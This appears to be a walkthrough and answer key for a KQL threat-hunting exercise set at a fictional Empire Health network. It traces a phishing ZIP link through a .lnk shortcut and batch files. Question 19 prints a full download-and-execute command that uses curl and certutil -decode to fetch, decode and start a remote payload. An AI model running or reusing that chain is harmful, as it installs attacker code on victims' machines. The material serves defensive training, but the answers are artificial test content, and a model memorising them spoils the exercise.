# Section 1: Empire Health Introduction

## Table of Contents
- [Question 1](#question-1)
- [Question 2](#question-2)
- [Question 3](#question-3)
- [Question 4](#question-4)
- [Question 5](#question-5)
- [Question 6](#question-6)
- [Question 7](#question-7)
- [Question 8](#question-8)
- [Question 9](#question-9)
- [Question 10](#question-10)
- [Question 11](#question-11)
- [Question 12](#question-12)
- [Question 13](#question-13)
- [Question 14](#question-14)
- [Question 15](#question-15)
- [Question 16](#question-16)
- [Question 17](#question-17)
- [Question 18](#question-18)
- [Question 19](#question-19)
- [Question 20](#question-20)
- [Question 21](#question-21)
- [Question 22](#question-22)
- [Question 23](#question-23)
- [Question 24](#question-24)
- [Question 25](#question-25)
- [Question 26](#question-26)

---

## Question 1

Incident Response Mission: Empire Health Network Under Threat

Type `done` to get started with your investigation.

### Answer

`done`

---

## Question 2

How many distinct employees have **"IT"** in their role?

### KQL Query

```kql
Employees
| where role has "IT"
```

### Answer

`75`

---

## Question 3

How many distinct email senders were not affiliated with the `empirehealth.ny` domain?

### KQL Query

```kql
Email
| where sender !endswith "empirehealth.ny"
| distinct sender
```

### Answer

`12088`

---

## Question 4

Let's start with looking at email links containing the phrase **"servicemembers"**.

How many results are there?

### KQL Query

```kql
Email
| where link contains "servicemembers"
```

### Answer

`0`

---

## Question 5

Look at the word **"military"** in the links but only senders that are not from the `empirehealth.ny` domain.

How many distinct senders meet this criteria?

### KQL Query

```kql
Email
| where link contains "military"
| where sender !endswith "empirehealth.ny"
| distinct sender
```

### Answer

`17`

---

## Question 6

How many distinct recipients do we get from non-EmpireHealth senders that contain the word **"healthcare"**?

### KQL Query

```kql
Email
| where sender !endswith "empirehealth.ny"
| where link contains "healthcare"
| distinct recipient
```

### Answer

`6`

---

## Question 7

How many distinct links are there from non-EmpireHealth senders that contain the word **"healthcare"**?

### KQL Query

```kql
Email
| where sender !endswith "empirehealth.ny"
| where link contains "healthcare"
| distinct link
```

### Answer

`4`

---

## Question 8

How many distinct file names are there?

### KQL Query

```kql
Email
| where sender !endswith "empirehealth.ny"
| where link contains "healthcare"
| distinct link
| extend filenames = tostring(parse_path(link).Filename)
| distinct filenames
```

### Answer

`3`

---

## Question 9

What file extension are these files?

### Notes

- Reviewing the filenames from the previous question shows that all of the suspicious files are ZIP archives.

### Answer

`.zip`

---

## Question 10

What is this user's role?

### KQL Query

```kql
Employees
| where email_addr == "eddie_mcfed@empirehealth.ny"
| project role
```

### Answer

`Federal Programs Coordinator`

---

## Question 11

What's his IP address?

### KQL Query

```kql
Employees
| where email_addr == "eddie_mcfed@empirehealth.ny"
| project ip_addr
```

### Answer

`10.10.0.29`

---

## Question 12

What time did he click it? (If he did not click it, type `no`)

### KQL Query

```kql
OutboundNetworkEvents
| where src_ip == "10.10.0.29"
| where url == "http://armedforceshealthcare.net/public/public/modules/Veterans_Medical_Services.zip"
```

### Answer

`2024-03-18T12:44:34Z`

---

## Question 13

What is the timestamp of the creation event?

### KQL Query

```kql
FileCreationEvents
| where hostname == "6BAN-DESKTOP"
| where filename == "Veterans_Medical_Services.zip"
```

### Answer

`2024-03-18T12:45:16Z`

---

## Question 14

Can you confirm the file hash as well?

### Answer

`d17275ae115eda1e0625ca041fc55a634c054f21cd81693ea2bf81580760bb3f`

---

## Question 15

What was this file name?

### KQL Query

```kql
FileCreationEvents
| where hostname == "6BAN-DESKTOP"
| where timestamp > datetime(2024-03-18T12:45:16.000Z)
```

### Notes

- Review the events immediately after `Veterans_Medical_Services.zip` is created.
- The first file created afterwards is the suspicious shortcut file.

### Answer

`benefit_information_veteran_affairs.pdf.lnk`

---

## Question 16

What is a `.lnk` file?

### Notes

- `.lnk` files are Windows shortcut files that point to another file, folder, or executable.

### Answer

`Windows shortcut`

---

## Question 17

What's going on in the `/Documents/` folder?

What file is seen first from the `/Documents/` folder?

### KQL Query

```kql
FileCreationEvents
| where hostname == "6BAN-DESKTOP"
| where timestamp > datetime(2024-03-18T12:45:16.000Z)
| where path contains "Documents"
```

### Answer

`1.bat`

---

## Question 18

What does that file extension stand for?

### Notes

- `.bat` is the extension for a Windows batch script.

### Answer

`batch script`

---

## Question 19

Give the full `curl` command that is run not long after that timestamp you found.

### KQL Query

```kql
ProcessEvents
| where timestamp > datetime(2024-03-18T12:45:16.000Z)
| where hostname == "6BAN-DESKTOP"
```

### Answer

```text
curl https://data.algoadvertise.com/data/usershares/rsergey/1.txt -o C:\Users\Public\Documents\1.bat && certutil -decode C:\Users\Public\Documents\1.bat C:\Users\Public\Documents\2.bat && start C:\Users\Public\Documents\2.bat
```

---

## Question 20

What is the name of the text file being downloaded in the curl command?

### Notes

- The `curl` command downloads the following text file.

### Answer

`1.txt`

---

## Question 21

Where is that file being saved? (After the `-o`, provide the full file path)

### Notes

- The destination path immediately follows the `-o` flag.

### Answer

`C:\Users\Public\Documents\1.bat`

---

## Question 22

What is the name of the command the `-decode` flag is being used with?

### Notes

- The `-decode` option belongs to the Windows utility shown in the command.

### Answer

`certutil`

---

## Question 23

What is the name of the `.bat` file being created with that command?

### Notes

- The decoded output file is specified as the second batch file.

### Answer

`2.bat`

---

## Question 24

What domain does this command have in it? (Include the `.com` in your answer)

### Notes

- Only the base domain is requested, not the full subdomain.

### Answer

`algoadvertise.com`

---

## Question 25

Who appears to be the user linked in that URL you found?

### Notes

- The username appears within the URL path.

### Answer

`rsergey`

---

## Question 26

What year was AlgoAdvertise LLC founded?

### Notes

- The founding year can be determined from the reference material provided in the mission.

### Answer

`2021`

---